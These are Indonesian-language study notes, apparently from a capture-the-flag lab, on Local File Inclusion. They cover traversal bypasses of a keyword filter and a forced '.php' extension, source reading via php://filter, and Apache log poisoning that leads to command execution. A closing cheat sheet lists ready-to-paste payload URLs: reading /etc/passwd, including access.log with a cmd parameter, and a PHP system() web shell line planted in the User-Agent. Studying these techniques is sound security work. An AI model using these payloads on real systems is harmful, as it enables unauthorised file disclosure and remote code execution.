# 🕸️ Bagian 2: Logika Web, LFI, dan Taktik Log Poisoning

Catatan konsep dasar bagaimana celah membaca berkas (*Local File Inclusion*) bisa diubah menjadi eksekusi perintah sistem (*Remote Code Execution*).

---

## 🔍 1. Pemahaman Utama: Apa itu LFI?
**Local File Inclusion (LFI)** terjadi karena kode web (PHP) menerima input nama berkas dari pengguna (*user*) secara mentah-mentah, tanpa diperiksa ulang keamanannya. 
*   **Logika Dasarnya**: Website memiliki fungsi untuk memanggil berkas halaman (seperti `include()`). Jika kita mengubah inputnya, kita bisa memaksa server web menampilkan berkas sensitif internal sistem Linux yang seharusnya rahasia (seperti `/etc/passwd`).

---

## 🛡️ 2. Konsep Membongkar Proteksi Web (Bypass Taktik)
Developer sering memasang aturan pembatas (satpam koding) untuk mencegah LFI. Berikut cara memahaminya:

### A. Proteksi Kata Wajib (Contoh: Harus ada kata 'dog' atau 'cat')
*   **Prinsip Celah**: Sistem hanya memeriksa apakah kata tersebut *ada* di dalam teks. Sistem tidak peduli di mana letaknya.
*   **Cara Manipulasi**: Gunakan teknik *Directory Traversal* (`../` yang artinya mundur/keluar folder). Masukkan kata wajib di awal, lalu gunakan `../` untuk membatalkannya.
*   **Contoh Logika**: `dog/../../etc/passwd` 
    *(Artinya bagi Linux: Masuk ke folder dog \-> Mundur \-> Mundur \-> Buka file passwd. Kata 'dog' tetap terbaca oleh satpam web, tapi sistem Linux mengabaikannya).*

### B. Proteksi Paksaan Ekstensi (Contoh: Otomatis ditambah `.php` di ujung)
*   **Prinsip Celah**: Jika kita panggil file `rahasia`, sistem membacanya sebagai `rahasia.php`. 
*   **Cara Manipulasi**: Cari tahu parameter konfigurasi kedua yang dibuat oleh developer (bisa diintip menggunakan PHP Wrapper Base64 `php://filter` untuk membaca kode sumber `index.php`). Di mesin ini, developer membuat opsi parameter `&ext=`. Dengan mengosongkannya di URL, kita memaksa server membuang paksaan tulisan `.php` tersebut.

---

## 🧪 3. Konsep Utama: Mengapa "Log Poisoning" Bisa Terjadi?
Log Poisoning adalah taktik mengubah hak akses **"Membaca Berkas"** (LFI) menjadi hak **"Menjalankan Perintah Terminal"** (RCE).

### 1. Mengenal Buku Tamu (`access.log`)
Setiap kali ada komputer bertamu ke sebuah website, server Apache akan mencatat riwayatnya ke file teks `/var/log/apache2/access.log`. Salah satu yang dicatat adalah **User-Agent** (nama browser tamu).

### 2. Menyuntikkan Racun Kode
Kita memalsukan identitas User-Agent kita menjadi sebaris kode pemrograman PHP, bukan nama browser asli:
```php
<?php system($_GET['cmd']); ?>
```
Server Apache yang polos akan langsung menulis kode PHP tersebut ke dalam berkas teks `access.log`.

### 3. Memicu Eksekusi Perintah
Ketika kita menggunakan celah LFI untuk membuka berkas `access.log` lewat browser, mesin PHP server akan membaca file log tersebut dari atas ke bawah. 

Begitu mesin PHP menyentuh kode racun yang kita suntikkan tadi, server tidak menganggapnya sebagai teks riwayat biasa. Server akan **mengeksekusi fungsi `system()`** tersebut. Karena kita menambahkan parameter `&cmd=ls`, server langsung menjalankan perintah terminal Linux `ls` dan menampilkan hasilnya di layar browser kita.

---

## 📋 4. Cheat Sheet Payload (Simpan untuk Copy-Paste)

### 📌 Membaca Kode Sumber Web (Format Base64)
Gunakan ini untuk mengintip logika koding developer tanpa mengeksekusi kodenya:
```text
http://<TARGET_IP>/?view=php://filter/convert.base64-encode/resource=dog/../index
```

### 📌 Membaca File Sistem Linux Bebas Ekstensi `.php`
```text
http://<TARGET_IP>/?view=dog/../../../../etc/passwd&ext=
```

### 📌 Membaca Log Apache & Menjalankan Perintah (RCE)
Setelah log diracuni via Curl, jalankan perintah terminal lewat ujung URL browser:
```text
http://<TARGET_IP>/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=ls%20-la
```
*(Catatan: Gunakan `%20` sebagai pengganti karakter spasi di URL browser).*
